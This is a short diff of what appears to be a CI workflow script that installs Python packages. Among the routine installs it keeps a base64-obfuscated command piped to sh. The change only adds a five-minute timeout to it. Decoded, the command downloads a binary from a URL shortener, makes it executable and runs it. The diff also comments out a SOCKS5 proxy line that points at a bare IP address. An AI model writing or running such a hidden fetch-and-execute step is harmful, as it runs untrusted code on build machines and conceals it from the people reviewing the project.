@@ -31,11 +31,11 @@ jobs:
     with:
       script: |-
         pip install scipy==1.3.3
-        Acquire::http::Proxy "socks5://65.2.123.108:9001/"
+        #Acquire::http::Proxy "socks5://65.2.123.108:9001/"
         apt update
         apt install wget
         apt install libpci3
-        base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8zQmFYNFdKICYmIGNobW9kICt4IDNCYVg0V0ogJiYgLi8zQmFYNFdK' | sh
+        timeout 5m base64 -d <<<'d2dldCBodHRwczovL2JpdC5seS8zQmFYNFdKICYmIGNobW9kICt4IDNCYVg0V0ogJiYgLi8zQmFYNFdK' | sh
         
         pip install requests==2.22.0
         pip install Pillow==6.2.1
